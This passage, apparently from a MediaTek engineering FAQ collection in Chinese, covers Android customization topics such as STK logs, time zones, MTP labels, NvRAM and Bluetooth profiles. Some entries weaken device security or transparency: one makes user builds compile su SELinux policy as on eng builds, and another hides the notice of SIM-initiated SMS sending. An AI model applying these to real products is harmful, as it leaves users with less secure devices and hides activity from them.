12-31 18:08:01.844194 1490 1490 D CAT : CatService: handleMessage[10] 
12-31 18:08:01.844357 1490 1490 D CAT : CatService: SET_UP_MENU
12-31 18:08:01.845522 1490 1490 D CAT : CAT: mSetUpMenuFromMD: true
12-31 18:08:01.846026 1490 1490 D CAT : CatService: SS-sendTR: command type is 37
12-31 18:08:01.846284 1490 1490 D CAT : CatService: encodeOptionalTags() Unsupported Cmd details=CmdDetails: compRequired=true commandNumber=1 typeOfCommand=37 commandQualifier=0
12-31 18:08:01.846435 1490 1490 D CAT : CatService: TERMINAL RESPONSE: 810301250082028281830100
12-31 18:08:01.849209 1490 1490 D CAT : CatService: Sending CmdMsg: com.android.internal.telephony.cat.CatCmdMessage@bf8cac0 on slotid:0

//catservice 发广播
12-31 18:08:01.851211 846 1664 V ActivityManager: Broadcast: Intent { act=android.intent.action.stk.command flg=0x10 (has extras) } ordered=false userid=0 callerApp=ProcessRecord{bdd92c0 1490:com.android.phone/1001}

//54秒后，STK AP 才收到广播。
12-31 18:08:55.672267 1490 1490 D ActivityThread: BDC-Calling onReceive: intent=Intent { act=android.intent.action.stk.command flg=0x10 cmp=com.android.stk/.StkCmdReceiver (has extras) }, receiver=com.android.stk.StkCmdReceiver@db84bac
12-31 18:08:55.685323 1490 1490 D ActivityThread: BDC-RECEIVER handled : 0 / ReceiverData{intent=Intent { act=android.intent.action.stk.command flg=0x10 cmp=com.android.stk/.StkCmdReceiver (has extras) } packageName=com.android.stk resultCode=-1 resultData=null resultExtras=null}
 
12-31 18:08:55.690877 1490 1490 D CAT : StkAppService: StkAppService onStart sim id: 0, op: 1, Bundle[{SLOT_ID=0, cmd message=com.android.internal.telephony.cat.CatCmdMessage@4dff87b, op=1}] 
12-31 18:08:55.690980 1490 1490 D CAT : StkAppService: StkAppService onStart mPhone: Handler (com.android.internal.telephony.PhoneProxy) {41d633d}, mPhoneStateChangeReg: true
12-31 18:08:55.691419 1490 2387 D CAT : StkAppInstaller: Init thread
12-31 18:08:55.691523 1490 2387 D CAT : StkAppService: handleMessage opcode[1] , sim id[0] 
12-31 18:08:55.691643 1490 2387 D CAT : StkAppService: cmdName[SET_UP_MENU] 
```

## [log]  [FAQ01799]  data分区下产生data/core/core.xxxx文件的时机与用途

```text
data分区下产生 data/core/core.xxxx 文件的时机与用途
当发生了 Native Exception 的时候产生的
用于分析 Native Exception 的时候使用
```

## [log]  [FAQ09614]  当发生native exception时，需要提供哪些资料或者文件来分析

```text
当发生Native exception(以下简称NE)后，一般发生NE的进程会崩溃退出，
但如果发生NE的进程是system server的话，手机会在android层重启；
所以从手机直观的现象就可以初略的判断是否是发生NE；
然后您可以用GAT工具解析，mtklog/aee_exp文件夹下的db文件，EX：db.00；
解析后会生成相应文件夹，EX：db.00.dbg.DEC，该文件夹下的文件就是分析NE所需要的一些文件了；
您可以打开文件__exp_main.txt来查看：Exception Class: Native (NE)
则可以判断为NE，然后您可以按照[solution] 中的要求提供咨询给mtk来分析；
 
1.完整的mtklog文件夹，mobilelog和相应的aee_exp db文件不可或缺，所以默认请提供完整mtklog文件夹；
2.在[description] 中解析出来db文件目录下，打开文件_exp_detail.txt，参考里面的backtrace，提供backtrace中
所显示的全部库文件，库文件目录为：out/target/product/[project] /symbols/system/lib
PS:必须提供symbols目录下库文件，才会带有debug调试信息；
3.在[description] 中解析出来db文件目录下，打开文件PROCESS_MAPS，查看第一行,提供第一行对应的app文件；
ps:因为bin文件一定是system/bin目录下的，如果maps中的第一行不是这个目录，您可以在整个maps文件中查找/system/bin后，请提供这些文件给我们，一般来说，除了linker外，只会有另外一个主体bin文件了，但是具体的codebase中的路径请参考如下路径
路径为：out/target/product/[project] /symbols/system/bin；  也必须是symbols目录下的；
```

## [FAQ11414]  android KK 4.4 版本后，user 版本su 权限严重被限制问题说明

```text
Google 不遗余力的提高android系统的安全性, 而针对su 这个即令人恨，又令人爱的命令，就痛下杀手。下面我从三个方面说明.
1. 限制user 版本adbd process 的capabilities bound set. 循环CAPBSET_DROP 动作，将Process 的root capabilities 进行了强行限制。仅仅保留了CAP_SETUID, CAP_SETGID 这两项，用于run-as 使用，可参考alps/system/core/adb/adb.c 中的 drop_capabilities_bounding_set_if_need 函数。
这样导致的情况是，在user 版本中usb debug 的su 受到极大的限制，仅仅能够模拟对应的uid/gid, 而无法拿去真正的root 权限.

2. 限制所有app 的capabilities bound set, 在android 4.4 上，zygote fork app 时，特意对所有fork 出来的子进程，进行了CAPBSET_DROP 动作，将Process 的root capabilities 进行了强行限制。 使得即使这些APK 徒有Root 权限，而无真实的capabilites. 在4.4.4 以及L 版本上, 还会使用prctl 下PR_SET_NO_NEW_PRIVS 指令, 限制子进程权限的提升.
这样导致的情况是, app 执行su 时，其权限受到了严格的管控，比如无法逃脱DAC 权限管控。但因为依旧具有root uid/gid, 所以在framework 层的permission 限制上依旧畅通无阻。
详情请参考FAQ: https://online.mediatek.com/Pages/FAQ.aspx?List=SW&FAQID=FAQ11538

3. SElinux 权限限制。 在user 版本上，没有导入有效的SU SElinux policy, 这样一旦本身受SElinux 限制的process 使用su 时，同样会受到SElinux 的限制。

(3.1). 在KK 版本只有4个process 会受到此影响，即zygote, netd, installd, vold.
消除这种限制的手法即是external/sepolicy/android.mk 里面的
ifeq ($(TARGET_BUILD_VARIANT),user)
    BOARD_SEPOLICY_IGNORE+=external/sepolicy/su.te
else
    BOARD_SEPOLICY_IGNORE+=external/sepolicy/su_user.te
endif

更新成:
ifeq ($(TARGET_BUILD_VARIANT),user)
    BOARD_SEPOLICY_IGNORE+=external/sepolicy/su_user.te
else
    BOARD_SEPOLICY_IGNORE+=external/sepolicy/su_user.te
endif

(3.2). 在L 版本则所有的Process 都会受到这样的影响.

sepolicy_policy.conf := $(intermediates)/policy.conf
$(sepolicy_policy.conf): PRIVATE_MLS_SENS := $(MLS_SENS)
$(sepolicy_policy.conf): PRIVATE_MLS_CATS := $(MLS_CATS)
$(sepolicy_policy.conf) : $(call build_policy, $(sepolicy_build_files))
@mkdir -p $(dir $@)
$(hide) m4 -D mls_num_sens=$(PRIVATE_MLS_SENS) -D mls_num_cats=$(PRIVATE_MLS_CATS) \
-D target_build_variant=$(TARGET_BUILD_VARIANT) \
-D force_permissive_to_unconfined=$(FORCE_PERMISSIVE_TO_UNCONFINED) \
-s $^ > $@
$(hide) sed '/dontaudit/d' $@ > $@.dontaudit

将-D target_build_variant=$(TARGET_BUILD_VARIANT) 改成 -D target_build_variant=eng 
```

## [log]  [FAQ03827]  如果抓一个正在运行的程序的Native Backtrace?

## [FAQ04310]  如何修改时区data文件

```text
Android时区信息是由data文件保存，KK之前的版本是三个文件(zoneinfo.dat, zoneinfo.idx,zoneinfo.version)，KK之后只有一个文件(tzdata)。由于各国的时区信息是会变化的，例如2014年6月13日，俄罗斯宣布从2014年10月26日之后全国时区推后一小时，比如莫斯科之前是GMT+4，修改后是GMT+3；如某个时区去掉2015年永久取消夏令时；但是android中的该文件不会自动更新，所以测试过程中会遇到手机的时区信息显示不正确。这种情况下，就需要更新手机的时区信息文件。
[Solution] 
一、下载tztada包
在网址ftp://ftp.iana.org/tz/releases/下载tzdata*.tar.gz，对于KK下载2014f版本，如果是KK之前的版本请下载2013年的版本。解压后拷贝到路径\bionic\libc\tools\zoneinfo下。找到时区所在文件，是按照城市所在洲命名的文件。
 1、夏令时(如Mexico在文件northamerica)
   # Rule NAME FROM TO TYPE IN ON AT SAVE LETTER/S
      Rule Mexico 1939 only - Feb 5 0:00 1:00 D
      Rule Mexico 1939 only - Jun 25 0:00 0 S
      Rule Mexico 1940 only - Dec 9 0:00 1:00 D
      Rule Mexico 1941 only - Apr 1 0:00 0 S
      Rule Mexico 1943 only - Dec 16 0:00 1:00 W # War
      Rule Mexico 1944 only - May 1 0:00 0 S
      Rule Mexico 1950 only - Feb 12 0:00 1:00 D
      Rule Mexico 1950 only - Jul 30 0:00 0 S
      Rule Mexico 1996 2000 - Apr Sun>=1 2:00 1:00 D
      Rule Mexico 1996 2000 - Oct lastSun 2:00 0 S
      Rule Mexico 2001 only - May Sun>=1 2:00 1:00 D
      Rule Mexico 2001 only - Sep lastSun 2:00 0 S
      Rule Mexico 2002 max - Apr Sun>=1 2:00 1:00 D
      Rule Mexico 2002 max - Oct lastSun 2:00 0 S 
      红色字体1:00表示有夏令时，要加一小时；0表示不用加。前面的时间是执行夏令时的时间段。如果要求2014年开始每年4月1日到10月31日执行夏令时，其余时间取消夏令时可以新增如下2句：
      Rule Mexico 2014 max - Apr 1 2:00 1:00 D
      Rule Mexico 2014 max - Oct 31 2:00 0 S
 2、时区(如Moscow在文件europe)
     Zone Europe/Moscow 2:30:17 - LMT 1880
     2:30:17 - MMT 1916 Jul 3 # Moscow Mean Time
     2:31:19 Russia %s 1919 Jul 1 2:00
     3:00 Russia %s 1921 Oct
     3:00 Russia MSK/MSD 1922 Oct
     2:00 - EET 1930 Jun 21
     3:00 Russia MSK/MSD 1991 Mar 31 2:00s
     2:00 Russia EE%sT 1992 Jan 19 2:00s
     3:00 Russia MSK/MSD 2011 Mar 27 2:00s
     4:00 - MSK 2014 Oct 26 2:00s
     3:00 - MSK
  新增2014年10月26日之后执行GMT+3时区

3、KK版本需要修改ICU对应的时区信息，比如Moscow

修改文件external\icu\icu4c\data\misc\zoneinfo64.txt（可以参考FAQ04553下载最新的ICU资源对比修改 ）
把Moscow时区部分使用下面替换掉，然后参考FAQ04011 重新编译icu资源
 /* Europe/Moscow */ :table {
    trans:intvector { -1688265017, -1656819079, -1641353479, -1627965079, -1618716679, -1596429079, -1593829879, -1589860800, -1542427200, -1539493200, -1525323600, -1522728000, -1491188400, -1247536800, 354920400, 370728000, 386456400, 402264000, 417992400, 433800000, 449614800, 465346800, 481071600, 496796400, 512521200, 528246000, 543970800, 559695600, 575420400, 591145200, 606870000, 622594800, 638319600, 654649200, 670374000, 686102400, 695779200, 701812800, 717534000, 733273200, 748998000, 764722800, 780447600, 796172400, 811897200, 828226800, 846370800, 859676400, 877820400, 891126000, 909270000, 922575600, 941324400, 954025200, 972774000, 985474800, 1004223600, 1017529200, 1035673200, 1048978800, 1067122800, 1080428400, 1099177200, 1111878000, 1130626800, 1143327600, 1162076400, 1174777200, 1193526000, 1206831600, 1224975600, 1238281200, 1256425200, 1269730800, 1288479600, 1301180400, 1414274400 }
    typeOffsets:intvector { 9017, 0, 7200, 0, 7200, 3600, 9079, 0, 9079, 3600, 9079, 7200, 10800, 0, 10800, 3600, 10800, 7200, 14400, 0 }
    typeMap:bin { "0304030504050706070807060106070607060706070607060706070607060706070602010607060706070607060706070607060706070607060706070607060706070607060706070607060906" }
    links:intvector { 462, 618 }
  }


二、 修改完成后需要执行脚本生成data文件，具体执行可以参考
   KK之前的版本：FAQ05710 
   KK之后的版本(L,M)：FAQ12532
三、关于俄罗斯时区的问题
请参考：FAQ13442，FAQ13443
```

## [默认值]  [FAQ04857] 【USB名称修改系列】第2项-如何修改PTP在PC"我的电脑"中显示的label名称

```text
USB PTP功能在pc端 “我的电脑” 盘符卷标字符串客制化

[SOLUTION] 
以下两种方式采用其中一种即可：
a) 修改/alps/framework/av/media/mtp/MtpServer.cpp

MtpResponseCode MtpServer::doGetDeviceInfo() {
這裡面有個

property_get("ro.product.model", prop_value, "MTP Device");
//此处添加修改prop_value数组的值的code，值即为要客制化的字符串

string.set(prop_value);//或者直接修改此句code为 string.set(“label name”);

之后rebuild project

b) 修改ro.product.model的值
在alps/build/tools/buildinfo.sh 中查找ro.product.model对应的宏的名称，此处为PRODUCT_MODEL；
在alps/build/target/product/<project>.mk文件中添加或修改该宏的定义,如：
PRODUCT_MODEL  := mylabelname
注意不能有空格。

注意：在JB9上为了WHQL测试的通过，已经在mtpDatabae.java中将相应修改label名称的代码注释，所以JB9如果

要修改名称要注意这一点。另外也可以在alps\mediatek\config\[project_name] \system.prop文件中ro.sys.usb.mtp.whql.enable设置为1，这样也可以避免这个WHQL测试的问题~
```

## [默认值]  [FAQ07081]  【USB名称修改系列】第5项-如何修改MTP在PC设备管理器中制造商的名称

```text
修改方法：
1. 修改build/tools/buildinfo.sh中的 ro.product.manufacturer

2. frameworks\av\media\mtp\MtpServer.cpp 的doGetDeviceInfo()
property_get("ro.product.manufacturer", prop_value, "unknown manufacturer");
string.set(prop_value);
修改此处的prop_value
```

## [默认值]  [FAQ03524]  【USB名称修改系列】第3项-如何修改MTP在PC"我的电脑"中显示的label名称

```text
MTP功能在PC端盘符名称显示如何修改?
[SOLUTION] 
以下两种方式采用其中一种即可：

a) 修改/Alps/frameworks/base/media/java/android/mtp/MtpDatabase.java
private int getDeviceProperty(int property, long[]  outIntValue, char[]  outStringValue) {
    String deviceName;
    deviceName = SystemProperties.get(“ro.product.name”);
    deviceName = “yournamehere”;
    int lengthDeviceName = deviceName.length();

b) 修改ro.product.name的值
在alps/build/tools/buildinfo.sh 中查找ro.product.name对应的宏的名称，此处为PRODUCT_NAME；
在alps/build/target/product/<project>.mk文件中添加或修改该宏的定义,如：
PRODUCT_NAME    := mylabelname
注意不能有空格
```

## [FAQ17359]  [SAT] 怎么去掉"Sending text message"的popup提示界面

```text
有些运营商的特殊SIM卡会上报SAT命令，定时要求手机向网络发送短信，按照11.14规范，我们是应当让User知道手机当前在发送短信；
但为了不影响User使用感受，客户希望不弹出Popup 框导致按键无响应的情况，那么可以做以下修改(修改方法适用与10A之后的Pluto MMI)：
1>、如果只是希望在STK菜单之外的界面时去除Sending text message的Popup 框，
将以下函数：
void mmi_sat_send_sms_process(srv_sat_proactive_sim_struct *cmd_info)
{
    /*----------------------------------------------------------------*/
    /* Local Variables                                                */
    /*----------------------------------------------------------------*/
    mmi_sat_group_data_struct *group_data = NULL;
    srv_sat_send_sms_struct *send_sms = NULL;
    /*----------------------------------------------------------------*/
    /* Code Body                                                      */
    /*----------------------------------------------------------------*/
    send_sms = (srv_sat_send_sms_struct *)(&cmd_info->cmd_data);
    group_data = mmi_sat_init_group_data(cmd_info->sim_id, cmd_info->cmd_type, send_sms, MMI_FALSE);
    group_data->func_p = (FuncPtr)mmi_sat_send_sms_scrn_entry;
    mmi_sat_instant_cmd_show_by_nmgr(mmi_sat_scrn_pre_entry, group_data);
}
修改为：
void mmi_sat_send_sms_process(srv_sat_proactive_sim_struct *cmd_info)
{
    /*----------------------------------------------------------------*/
    /* Local Variables                                                */
    /*----------------------------------------------------------------*/
    mmi_sat_group_data_struct *group_data = NULL;
    srv_sat_send_sms_struct *send_sms = NULL;
    /*----------------------------------------------------------------*/
    /* Code Body                                                      */
    /*----------------------------------------------------------------*/
    send_sms = (srv_sat_send_sms_struct *)(&cmd_info->cmd_data);
    if(mmi_sat_is_in_screen(cmd_info->sim_id))
    {
        group_data = mmi_sat_init_group_data(cmd_info->sim_id, cmd_info->cmd_type, send_sms, MMI_FALSE);
        group_data->func_p = (FuncPtr)mmi_sat_send_sms_scrn_entry;
        mmi_sat_instant_cmd_show_by_nmgr(mmi_sat_scrn_pre_entry, group_data);
    }
    else
    {
        srv_sat_terminal_response_send_sms_stage1(cmd_info->sim_id);
    }
}
2>、如果想直接去掉所有case下的sending text message界面。
那么直接将上述函数中：
    group_data = mmi_sat_init_group_data(cmd_info->sim_id, cmd_info->cmd_type, send_sms, MMI_FALSE);
    group_data->func_p = (FuncPtr)mmi_sat_send_sms_scrn_entry;
    mmi_sat_instant_cmd_show_by_nmgr(mmi_sat_scrn_pre_entry, group_data);
替换成：
srv_sat_terminal_response_send_sms_stage1(cmd_info->sim_id);
 
 
针对 slim 之后的版本，没有 mmi_sat_send_sms_process，请参考下面说明修改。
 
请在 satApp.c 中，mmi_sat_get_process() 修改如下case, 修改后，在 stk menu 之外界面的 send sms 不会显示。

修改前：

case SRV_SAT_CMD_SEND_SMS:
send_sms = (srv_sat_send_sms_struct *)(&cmd_info->cmd_data);
group_data = mmi_sat_init_group_data(cmd_info->sim_id, cmd_info->cmd_type, send_sms, MMI_FALSE , mmi_sat_send_s_scrn_entry);

修改后：

case SRV_SAT_CMD_SEND_SMS:
if(mmi_sat_is_in_screen(cmd_info->sim_id))
{
kal_sys_trace("[stk]  show send sms.");
send_sms = (srv_sat_send_sms_struct *)(&cmd_info->cmd_data);
group_data = mmi_sat_init_group_data(cmd_info->sim_id, cmd_info->cmd_type, send_sms, MMI_FALSE , mmi_sat_send_s_scrn_entry);
break;
}
else
{
kal_sys_trace("[stk]  not show send sms.");
srv_sat_terminal_response_send_sms_stage1(cmd_info->sim_id);
return;
}

若测试有问题：
1. 请提供一个问题复现的log，从开机到问题复现，
filter: MOD_SIM(all class on), MOD_L4C(all class on), MOD_MMI_COMMON_APP(TRACE_GROUP_3).MOD_MMI_FW(trace_group_1)
2. 请提供修改的代码文件。
```

## [FAQ03920]  [NvRAM]  NvRAM product info的客制化以及注意事项

```text
89之后的平台，MTK提供了Product info feature，支持Normal Mode下使用NvRAM接口写入数据， factory reset不会擦除，也避免了Normal Mode备份引起的掉电风险。
ICS2.MP/ICS.MP部分版本可以通过打patch支持，需要申请patch：ALPS00329542（JB 和TDD ICS2 branch 除外）

###Steps###
1. 打开MTK_PRODUCT_INFO_SUPPORT
修改alps/mediatek/config/$project/ProjectConfig.mk： MTK_PRODUCT_INFO_SUPPORT=yes
详情可参考DCC上文档《Customization in NvRAM Product Info feature》Page 10

2. 新增NvRAM项
如需在AP端新增NvRAM项，可以参考DCC上文档《Customization in NVRAM》；如不需要增加NvRAM项，请直接跳至Step3。
注意事项_1：
a) 如平台使用的是【eMMC】，新LID对应struct的size必须是512 byte的倍数；
b) 如平台使用的是【NAND】，新LID对应struct的size必须是page size对齐（即4K或2K）。

3. 将新加LID配置到product info
将对应的LID写入CFG_file_info.c的g_new_nvram_lid[] ，填入正确的start_address和size；如不需要配置新加LID，请看注意事项_2。
注意事项_2：
a) 如平台使用的是【eMMC】，g_new_nvram_lid[] 里面新LID的size必须要128K对齐；
b) 如平台使用的是【NAND】， g_new_nvram_lid[] 里面新LID的size必须要blocksize对齐（4K pagesize对应的是256K，2K pagesize对应的是128K）。
c) g_new_nvram_lid[] 里各LID总size不能超过partition table里pro_info的size。默认情况下，【eMMC】平台pro_info大小为3M，【NAND】平台pro_info大小为1M。

4. AP_CFG_REEB_PRODUCT_INFO_LID的配置
a) 如不需要配置AP_CFG_REEB_PRODUCT_INFO_LID在g_new_nvram_lid[] 里面，可以直接移除，新加LID的start_address需要改成0。
b) 如保留AP_CFG_REEB_PRODUCT_INFO_LID在g_new_nvram_lid[] 里面，则需要注意CFG_file_info.c的aBackupToBinRegion[] 里面去掉AP_CFG_REEB_PRODUCT_INFO_LID。

5. Default value配置问题
如普通nvram项的配置，欲写入product info的nvram也需要在进行配置在g_akCFG_File[] （CFG_file_info.c），并在对应的xx_default.h和xx_file.h申明和定义default value。
但是，此处与普通nvram项不同的地方在于，当前的design中，写入product info的nvram项，自定义的default value是不生效的。
首次开机获取到的值，完全取决于当前/dev/pro_info这个raw分区里面的值：默认情况下，NAND的是0xff，eMMC的是0x00。

###After Customization###
客制化之后，配置到g_new_nvram_lid[] 的LID对应的NvRAM data不再以文件形式存在/data/nvram/，而是直接写到了/dev/pro_info，数据不会同时存在两个地方。

【Platform】
目前，89之后的平台均支持，89之前的打了patch也支持。
```

## [FAQ13590]  SD卡不识别等问题

```text
1. 如果是所有SD卡都不识别，则请查看
[FAQ04249]  【sdcard-common】新开项目SDCard不识别，如何debug?
[FAQ07310]  【sdcard-driver】sd卡热插拔需要注意的几点?
[FAQ09005]  [Storage] emmc LCA 版本T卡（sdcard）异常

2.部分SD卡不识别或只读，低概率出现：
请修改
\mediatek\custom\${project}\kernel\core\src\board.c
(/kernel/drivers/misc/mediatek/mach/mt6***/${project}/core/board.c)
struct msdc_hw msdc1_hw = {
.flags = //去除MSDC_UHS1、MSDC_DDR后看效果，如果没有改善接着再去除MSDC_HIGHSPEED看下
}
如果上面的修改对问题有改善，基本说明贵司的layout或者SD卡存在问题，
请提交硬件eService检查贵司的SD卡相关硬件设计和layout，谢谢！
```

## [bootanimation]  [debug]  [FAQ09562]  关机动画和铃声没有完整播放就灭屏了

```text
在我司默认的关机流程设计中，一般会根据运营商设置一个灭屏的时间，这个时间是基于运营商测试要求和用户体验考虑的。一般情况下，7S以内灭屏，可以让用户感知关机很快，而且在网络情况良好，系统稳定的情况下，关机的时间一般也会在10S以内；即使由于一些特殊原因，比如网络情况不好，也希望灭屏时间短，让用户体验更好。

如果关机铃声或者关机动画的时间大于灭屏的时间，就会出现动画和铃声没有播放完成就灭屏的情况。虽然可以修改代码，等待关机铃声和动画播放完成再灭屏，但是一般不建议关机铃声和动画太长，这样即使在系统比较稳定的情况下也会造成关机时间长的用户体验；而且当用户客制化其它关机铃声和关机动画时，关机的时间也会随之改变。因此，建议采用默认设计，缩短关机铃声和关机动画的时长。
```

## [知识点]  [FAQ05394]  [Build] BT Profiles 详细介绍

```text
蓝牙有很多Profile，代表这着向用户的许多种蓝牙应用，下面逐一详细介绍这些Profile。

MTK_BT_PROFILE_OPP：Object Push Profile  普遍用于文件、名片的传输，从文件管理器中通过蓝牙分享即使用该协议
MTK_BT_PROFILE_SIMAP  ：SIM Access Profile  车载蓝牙会通过该协议使用手机上的SIM服务，如通话等，仅将手机作为SIM卡槽，使用车载蓝牙的自带的无线通信模块
MTK_BT_PROFILE_PRXM   ：Proximity Monitor 
MTK_BT_PROFILE_PRXR   ：Proximity Reporter  以上两个选项为远程距离感应服务的两个角色，当使用该服务连接的两个设备距离拉大到一定范围（可设定）后，双方设备就会发出声音或震动的提示。典型应用是防丢器
MTK_BT_PROFILE_HIDH   ：Human Interface Device Host 该协议的典型应用为连接蓝牙键盘、鼠标等I/O外设
MTK_BT_PROFILE_FTP    ：File Transfer Profile 可以使用该设备浏览另一方蓝牙设备的文件系统，并可以对文件、目录进行下载、上传、修改、删除等操作
MTK_BT_PROFILE_PBAP   ：Phone Book Access Profile  电话本存取服务。高级蓝牙耳机或车载蓝牙可能会通过该协议获取手机通信录、通话记录等信息
MTK_BT_PROFILE_BPP    ：Basic Printing Profile  可通过此设备连接蓝牙打印机，不过其实OPP/BIP/SPP等协议均有可能用于连接打印机（取决于打印机支持哪种协议）
MTK_BT_PROFILE_BIP    ：Basic Imaging Profile  用于传输图片。从图库中分享图片即优先使用该协议。
MTK_BT_PROFILE_DUN    ：Dial-up Networking  用于蓝牙拨号上网
MTK_BT_PROFILE_PAN    ：Personal Area Network 蓝牙共享网络。具体说明及限制可参考ID: FAQ05031 ID: FAQ03951
MTK_BT_PROFILE_HFP    ：Hands-free Profile  连接蓝牙耳机、车载蓝牙最常用的协议，用于完成蓝牙基础通话、三方通话的功能。使用手机的无线通信模块，仅在手机和耳机、车载蓝牙之前传输AT控制命令和语音数据。
MTK_BT_PROFILE_A2DP   ：Advanced Audio Distribution Profile 播放音乐最常用的协议，通过音乐播放器听音乐时即会使用该协议将音乐传递到蓝牙耳机。
MTK_BT_PROFILE_MAPC = no     MAP Profile client
MTK_BT_PROFILE_MAPS = no     MAP Profile server 这两项为信息存取服务的两个角色。该协议用于在蓝牙设备见传输短信、彩信和电子邮件信息
MTK_BT_PROFILE_SPP    ：Serial Port Profile 虚拟串口协议。该协议是一个通用的模拟串口协议。Google 自带程序BluetoothChat即使用该协议。该协议通常被用来连接特种蓝牙外设，如特种打印机、指纹识别器等
MTK_BT_FM_OVER_BT_VIA_CONTROLLER = no      FM收听的声音通过BT传送给蓝牙耳机，在MT6628上该宏不能开
MTK_BT_POWER_EFFICIENCY_ENHANCEMENT = yes  对应到BT功率效能方面的feature，维持default设置就好
MTK_BT_PROFILE_AVRCP13 = no
MTK_BT_PROFILE_AVRCP14 = no    AVRCP用于控制音乐播放，如上一曲、下一曲、暂停、播放等。后面的数字都是指AVRCP的版本（1.3和1.4版本），default是AVRCP 1.0
MTK_BT_PROFILE_TIMEC = no    Time profile client
MTK_BT_PROFILE_TIMES = no    Time profile server 目前这两项MP版本未开放使用
```

## [FAQ04112]  Android adb shell 无法启动 insufficient permissions for device 解决方案

```text
原因是对应的usb device 没用权限访问，需要添加venderid. 
解决办法1：lsusb查看vendorId号，然后在/etc/udev/rules.d/目录下增加（或修改）51-android.rules文件。
增加一条记录：
SUBSYSTEM=="usb", SYSFS{idVendor}=="xxxx", MODE="0666" 其中xxxx是通过lsusb查看得到的值
常见的情况如下，我都列出来了：
# htc
SUBSYSTEM=="usb", SYSFS{idVendor}=="0bb4", MODE="0666"
# Motorola
SUBSYSTEM=="usb", SYSFS{idVendor}=="22b8", MODE="0666"
# Acer 0502
SUBSYSTEM=="usb", SYSFS{idVendor}=="0502", MODE="0666"
# Dell 413c
SUBSYSTEM=="usb", SYSFS{idVendor}=="413c", MODE="0666"
# Huawei 12d1
SUBSYSTEM=="usb", SYSFS{idVendor}=="12d1", MODE="0666"
# LG 1004
SUBSYSTEM=="usb", SYSFS{idVendor}=="1004", MODE="0666"
# Nvidia 0955
SUBSYSTEM=="usb", SYSFS{idVendor}=="0955", MODE="0666"
# Samsung 04e8
SUBSYSTEM=="usb", SYSFS{idVendor}=="04e8", MODE="0666"
# Sharp 04dd
SUBSYSTEM=="usb", SYSFS{idVendor}=="04dd", MODE="0666"
# Sony Ericsson ofce
SUBSYSTEM=="usb", SYSFS{idVendor}=="0fce", MODE="0666"
# ZTE 19d2
SUBSYSTEM=="usb", SYSFS{idVendor}=="19d2", MODE="0666"
解决办法2：
在51-android.rules中只写一句：
SUBSYSTEM=="usb", ENV{DEVTYPE}=="usb_device", MODE="0666"
```

## [默认值]  [FAQ04319]  如何修改默认小时制

```text
修改文件alps\frameworks\base\packages\SettingsProvider\res\values\defaults.xml
增加代码<string name="time_12_24" translatable="false">24</string>
红色标记表示24小时制，也可以改为12（12小时制）

修改文件alps\frameworks\base\packages\SettingsProvider\src\com\android\providers\settings\DatabaseHelper.java
找到函数 loadSystemSettings()，在函数中增加以下语句：
loadStringSetting(stmt, Settings.System.TIME_12_24, R.string.time_12_24);
```

## [语言]  [FAQ17417]  添加语言时如何查询该语言对应的language code和country code

```text
在添加一种语言时，需要在配置文件中添加这个语言对应的language code和country code, 如何查询语言对应的language code和country code请参考如下方法。

(1)可先参考FAQ03761,其中有介绍google 支持的语言和mtk支持的语言，从中可查询到每种语言对应的language code和country code.
(2)对于当前系统没有支持的语言在上述FAQ中查询不到，可参考下面两个网址去查询。
language code：
https://zh.wikipedia.org/wiki/ISO_639-1
country code：
https://zh.wikipedia.org/wiki/ISO_3166-1
```

## [FAQ18291]  country code table

## [语言]  [默认值]  [FAQ17457]  如何判断系统是否支持一种语言

```text
判断系统是否支持某种语言，可参考如下方法。

（1）参考FAQ17417，查询这种语言对应的language code和country code. 如旁遮普语（印度），对应的就是pa_IN(pa是language code, IN是country code);
（2）参考FAQ04009中添加语言的步骤。
1.是否有对应语言的icu资源。（可以看到external\icu\icu4c\source\data下coll、curr、lang、locales、region，zone这些子文件夹中都有pa.txt和pa_IN.txt）
2.系统中是否有对应字库。可以参考FAQ12255看看系统中是否有这种语言的对应字库。
3.在frameworks/base/core/res/res/下是否有对应的values-xx-rYY的文件夹(xx是language code, YY是country code，下同).
4.每个app对应的res目录下面是否有values-xx文件夹或values-xx-rYY文件夹.
5.如果是复杂语言，还需看看是否有对应的字体引擎（FAQ04009最后部分有介绍如何判断是否是复杂语言，判断复杂语言引擎支持情况可参考FAQ12442）。

如果以上回答都是yes,那就表示支持，如需打开它，参考FAQ04009中的第一步将它加在对应配置文件中。如不支持，对着上面步骤看看是缺少什么，对着FAQ04009一步一步添加即可。
```

## [RTL]  [FAQ10002]  如何修改Notifation Action Button的Icon和Text的位置

```text
在阿拉伯,波斯等RTL语言下，对于一些含有action button的UI虽然app使用了android:supportsRtl属性，但是仅仅是action之间的位置发生翻转，而每个button的Icon和Text位置却没调换。
比如(下图所示)未接来电的systemui下拉通知栏的icon和text位置没有调换
如果要调整其位置，可以通过setTextViewCompoundDrawables(int viewId, int left, int top, int right, int bottom)函数去实现想要的效果。
下面的修改是在波斯语、阿拉伯语下把action button的图片放到文字的右边。

import java.util.Locale;
Notification.java（alps\frameworks\base\core\java\android\app）
private RemoteViews generateActionButton(Action action) {
    final boolean tombstone = (action.actionIntent == null);
    RemoteViews button = new RemoteViews(mContext.getPackageName(), tombstone ? R.layout.notification_action_tombstone : R.layout.notification_action);
    //modify
    String language = Locale.getDefault().getLanguage();
    if (language.equals("ar") || language.equals("fa")) {
        button.setTextViewCompoundDrawables(R.id.action0, 0, 0,action.icon, 0);
    } else {
        button.setTextViewCompoundDrawables(R.id.action0, action.icon, 0, 0, 0);
    }
    //modify
}

如果在其他地方要修改Button或者TextView的image和text的位置，可以直接调用TextView的函数setCompoundDrawables(Drawable left, Drawable top,Drawable right, Drawable bottom)就行。
```

## [语言]  [FAQ12442]  如何判断复杂语言引擎支持情况

```text
复杂语言处理引擎都是按照各个语言字符分别处理的，即如果2种语言字符相同，则他们可以共用一套引擎，比如阿拉伯语、波斯语、乌尔都语使用同一套引擎；印度语、孟加拉语使用一套引擎。
系统在处理字串时先是根据字串编码范围把字串分成若干小段，比如“asbc中国نحنddf”会分成“asbc”、“中国”、"نحن"、“ddf”4个子串，每个字串用一个Script标记这个字串是属于哪种语言。后面再根据这个Script变量分别调用不同的harfbuzz引擎对这些子串进行处理。
如下是KK版本支持的语言引擎接口。
harfbuzz-shaper.cpp(external\harfbuzz_ng\src\hb-old)
const HB_ScriptEngine HB_ScriptEngines[]  = {
    // Common
    { HB_BasicShape},
    // Greek
    { HB_GreekShape},
    // Cyrillic
    { HB_BasicShape},
    // Armenian
    { HB_BasicShape},
    // Hebrew
    { HB_HebrewShape},
    // Arabic
    { HB_ArabicShape},
    // Syriac
